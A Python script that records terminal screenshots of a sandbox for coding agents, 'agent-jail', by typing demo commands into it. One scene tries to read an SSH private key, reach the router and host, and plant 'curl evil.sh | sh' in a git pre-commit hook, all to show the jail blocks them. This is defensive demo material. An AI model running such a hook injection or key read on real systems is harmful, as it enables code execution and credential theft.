#!/usr/bin/env python3
"""Draw the README's terminal pictures from real runs of bin/agent-jail.

    python3 docs/screenshot.py picker > docs/picker.svg
    python3 docs/screenshot.py inside > docs/inside.svg

Each one runs agent-jail on a pseudo-terminal in a throwaway home directory,
types what a user would, and draws the terminal as SVG.

  picker  The agent picker, with stand-in agents installed: press down to
          Codex, then Enter. The run ends by declining the install.
  inside  A shell in the jail (--net isolated, so it needs pasta, nft and the
          internet) trying to read an SSH key that exists outside it, reach
          the LAN and the host, and plant a git hook.

The throwaway home is shown as /home/you.
"""

import fcntl
import os
import pty
import re
import select
import struct
import subprocess
import sys
import tempfile
import termios
import time
from html import escape
from pathlib import Path

JAIL = Path(__file__).resolve().parent.parent / "bin" / "agent-jail"
ROWS = 40

# GitHub's dark palette, so the pictures sit well on github.com.
BG, BORDER, FG = "#0d1117", "#30363d", "#e6edf3"
COLOURS = {"dim": "#7d8590", 32: "#3fb950", 36: "#39c5cf"}
FONT = ('ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, '
        '"DejaVu Sans Mono", "Liberation Mono", monospace')
CELL_W, CELL_H, PAD, BAR = 8.4, 20, 20, 36

SCENES = {
    "picker": {
        "cols": 84,
        "args": [],
        "steps": [(b"\x1b[B", None), (b"\r", b"[Y/n] ")],
        "finish": b"n\r",
        "label": "The agent-jail picker: eight coding agents, whether each is installed, "
                 "and an offer to install Codex inside the jail",
    },
    "inside": {
        "cols": 92,
        "args": ["shell"],
        "steps": [(cmd.encode() + b"\r", b"$ ") for cmd in [
            "ls -A ~",
            "cat ~/.ssh/id_ed25519",
            "curl -sS http://192.168.1.1          # the router",
            "curl -sS http://127.0.0.1:11434      # Ollama on this machine",
            "curl -sSI https://example.com | head -1",
            "echo 'curl evil.sh | sh' >> .git/hooks/pre-commit",
        ]],
        "finish": b"exit\r",
        "label": "A shell inside agent-jail: the home directory holds only the project, "
                 "an SSH key outside the jail is missing, the router and the host's "
                 "Ollama refuse connections, example.com answers, and a git hook "
                 "can't be written",
    },
}


def stand_in(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("#!/bin/sh\n")
    path.chmod(0o755)


def stage(root: Path) -> tuple[Path, Path, dict[str, str]]:
    """A home directory with a git project, an SSH key, Claude Code and
    OpenCode on PATH, and Gemini CLI installed by agent-jail."""
    home = root / "home"
    work = home / "Projects" / "my-app"
    work.mkdir(parents=True)
    (home / ".ssh").mkdir()
    (home / ".ssh" / "id_ed25519").write_text("PRIVATE KEY\n")
    stand_in(home / ".local/bin/claude")
    stand_in(home / ".opencode/bin/opencode")
    stand_in(home / ".local/share/agent-jail/tools/gemini/bin/gemini")
    env = {
        "HOME": str(home),
        "PATH": f"{home}/.local/bin:{home}/.opencode/bin:/usr/bin:/bin",
        "TERM": "xterm-256color",
        "LANG": "C.UTF-8",
        "XDG_RUNTIME_DIR": str(root),
    }
    subprocess.run(["git", "init", "-q", str(work)], env=env, check=True)
    return home, work, env


def read_until(fd: int, out: bytes, expect: bytes | None, timeout: float = 15) -> bytes:
    """Read until the output goes quiet, ending with expect if it is given."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if select.select([fd], [], [], 0.4)[0]:
            try:
                data = os.read(fd, 4096)
            except OSError:  # EIO: the program has exited
                break
            if not data:
                break
            out += data
        elif expect is None or out.endswith(expect):
            break
    return out


def run(scene: dict, work: Path, env: dict[str, str]) -> bytes:
    """Run agent-jail on a terminal and type the scene's steps; return what it
    printed before the last step's answer."""
    pid, fd = pty.fork()
    if pid == 0:
        winsize = struct.pack("HHHH", ROWS, scene["cols"], 0, 0)
        fcntl.ioctl(0, termios.TIOCSWINSZ, winsize)
        os.chdir(work)
        os.execve(str(JAIL), [str(JAIL), *scene["args"]], env)
    out = read_until(fd, b"", scene["steps"][0][1])
    for keys, expect in scene["steps"]:
        os.write(fd, keys)
        out = read_until(fd, out, expect)
    os.write(fd, scene["finish"])
    read_until(fd, b"", None)
    os.waitpid(pid, 0)
    return out


class Screen:
    """Just enough of a terminal for agent-jail and bash."""

    def __init__(self, cols: int) -> None:
        self.cols = cols
        self.cells = [[(" ", ())] * cols for _ in range(ROWS)]
        self.x = self.y = 0
        self.style: tuple = ()
        self.wrap = True

    def feed(self, text: str) -> None:
        for m in re.finditer(r"\x1b\[([?0-9;]*)([A-Za-z])|(.)", text, re.S):
            params, final, char = m.groups()
            if char is None:
                self.csi(params, final)
            elif char == "\r":
                self.x = 0
            elif char == "\n":
                self.y += 1
            elif char >= " ":
                if self.x >= self.cols:
                    if not self.wrap:
                        continue
                    self.x, self.y = 0, self.y + 1
                self.cells[self.y][self.x] = (char, self.style)
                self.x += 1

    def csi(self, params: str, final: str) -> None:
        n = int(params) if params.isdigit() else 1
        if params == "?7":
            self.wrap = final == "h"
        elif final == "A":
            self.y = max(0, self.y - n)
        elif final == "K":
            self.cells[self.y] = [(" ", ())] * self.cols
        elif final == "m":
            for p in (params or "0").split(";"):
                p = int(p or 0)
                if p == 0:
                    self.style = ()
                elif p == 1:
                    self.style += ("bold",)
                elif p == 2:
                    self.style += ("dim",)
                elif p in COLOURS:
                    self.style += (p,)


def svg(screen: Screen, label: str) -> str:
    lines = list(screen.cells[:screen.y + 1])
    width = 2 * PAD + screen.cols * CELL_W
    height = BAR + 12 + len(lines) * CELL_H + PAD
    out = [
        f'<svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" '
        f'width="{width:.0f}" height="{height}" viewBox="0 0 {width:.0f} {height}" '
        f'role="img" aria-label="{escape(label)}">',
        f"<style>text{{font:14px {FONT};fill:{FG};white-space:pre}}"
        ".bold{font-weight:700}"
        + "".join(f".c{k}{{fill:{v}}}" for k, v in COLOURS.items())
        + "</style>",
        f'<rect x="0.5" y="0.5" width="{width - 1:.0f}" height="{height - 1}" rx="10" '
        f'fill="{BG}" stroke="{BORDER}"/>',
    ]
    for i, colour in enumerate(["#ff5f57", "#febc2e", "#28c840"]):
        out.append(f'<circle cx="{PAD + 6 + i * 20}" cy="{BAR // 2}" r="6" fill="{colour}"/>')
    out.append(f'<text x="{width / 2:.0f}" y="{BAR // 2 + 5}" text-anchor="middle" '
               f'class="cdim">~/Projects/my-app</text>')
    for row, cells in enumerate(lines):
        y = BAR + 12 + row * CELL_H + 14
        col = 0
        while col < screen.cols:
            style = cells[col][1]
            end = col
            while end < screen.cols and cells[end][1] == style:
                end += 1
            text = "".join(c for c, _ in cells[col:end]).rstrip()
            if text.strip():
                indent = len(text) - len(text.lstrip())
                classes = " ".join("bold" if s == "bold" else f"c{s}" for s in style)
                attr = f' class="{classes}"' if classes else ""
                out.append(f'<text x="{PAD + (col + indent) * CELL_W:.1f}" y="{y}"{attr}>'
                           f"{escape(text.lstrip())}</text>")
            col = end
    # The cursor, waiting for the next key.
    out.append(f'<rect x="{PAD + screen.x * CELL_W:.1f}" y="{BAR + 12 + screen.y * CELL_H + 2}" '
               f'width="{CELL_W:.1f}" height="{CELL_H - 3}" fill="{FG}" opacity="0.8"/>')
    out.append("</svg>")
    return "\n".join(out) + "\n"


def main() -> None:
    if len(sys.argv) != 2 or sys.argv[1] not in SCENES:
        sys.exit(f"usage: {sys.argv[0]} {'|'.join(SCENES)} > docs/NAME.svg")
    name = sys.argv[1]
    scene = SCENES[name]
    with tempfile.TemporaryDirectory() as tmp:
        home, work, env = stage(Path(tmp))
        output = run(scene, work, env).decode().replace(str(home), "/home/you")
    screen = Screen(scene["cols"])
    command = " ".join(["agent-jail", *scene["args"]])
    screen.feed(f"\x1b[32m~/Projects/my-app\x1b[0m $ {command}\r\n")
    screen.feed(output)
    sys.stdout.write(svg(screen, scene["label"]))


if __name__ == "__main__":
    main()
